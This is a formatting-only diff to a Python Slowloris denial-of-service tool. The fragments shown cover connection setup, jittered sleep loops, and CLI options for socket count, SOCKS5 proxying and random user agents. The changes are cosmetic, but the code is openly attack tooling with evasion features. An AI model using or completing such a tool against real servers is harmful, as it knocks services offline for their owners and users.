@@ -91,6 +91,7 @@ else:
     try:
         from python_socks import ProxyType
         from python_socks.async_.asyncio import Proxy
+
         _PROXY_AVAILABLE = True
     except ImportError:
         pass
@@ -100,6 +101,7 @@ else:
 @dataclass(frozen=True)
 class Config:
     """Configuration for Slowloris attack with validation."""
+
     host: str
     port: int = 80
     sockets: int = 150
@@ -168,8 +170,7 @@ class Slowloris:
         # Set secure ciphers
         try:
             ssl_context.set_ciphers(
-                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:"
-                "!aNULL:!MD5:!DSS"
+                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS"
             )
         except ssl.SSLError:
             # Some systems may not support custom ciphers
@@ -222,11 +223,7 @@ class Slowloris:
             try:
                 host_addr: str = str(sockaddr[0])  # Cast to str for type safety
                 return await asyncio.wait_for(
-                    asyncio.open_connection(
-                        host_addr,
-                        self.config.port,
-                        ssl=self._ssl
-                    ),
+                    asyncio.open_connection(host_addr, self.config.port, ssl=self._ssl),
                     timeout=10.0,
                 )
             except OSError as e:
@@ -280,18 +277,14 @@ class Slowloris:
                     # Calculate sleep time with jitter
                     if self.config.jitter > 0:
                         sleep_time = self.config.sleeptime + random.uniform(
-                            -self.config.jitter,
-                            self.config.jitter
+                            -self.config.jitter, self.config.jitter
                         )
                     else:
                         sleep_time = self.config.sleeptime
 
                     # Wait with early exit on shutdown
                     try:
-                        await asyncio.wait_for(
-                            self._shutdown.wait(),
-                            timeout=sleep_time
-                        )
+                        await asyncio.wait_for(self._shutdown.wait(), timeout=sleep_time)
                     except asyncio.TimeoutError:
                         pass  # Normal timeout, continue loop
 
@@ -376,6 +369,7 @@ async def _run_attack(config: Config) -> None:
     except NotImplementedError:
         # Windows doesn't support add_signal_handler
         import signal as sig
+
         sig.signal(sig.SIGINT, lambda s, f: signal_handler())
         sig.signal(sig.SIGTERM, lambda s, f: signal_handler())
 
@@ -386,29 +380,34 @@ async def _run_attack(config: Config) -> None:
 @click.command()
 @click.argument("host", required=False)
 @click.option(
-    "-p", "--port",
+    "-p",
+    "--port",
     default=80,
     type=int,
     help="Port of webserver, usually 80 or 443",
 )
 @click.option(
-    "-s", "--sockets",
+    "-s",
+    "--sockets",
     default=150,
     type=int,
     help="Number of concurrent connections to maintain",
 )
 @click.option(
-    "-v", "--verbose",
+    "-v",
+    "--verbose",
     is_flag=True,
     help="Enable verbose logging",
 )
 @click.option(
-    "-ua", "--randuseragents",
+    "-ua",
+    "--randuseragents",
     is_flag=True,
     help="Randomize user-agent for each connection",
 )
 @click.option(
-    "-x", "--useproxy",
+    "-x",
+    "--useproxy",
     is_flag=True,
     help="Use SOCKS5 proxy for connections",
 )
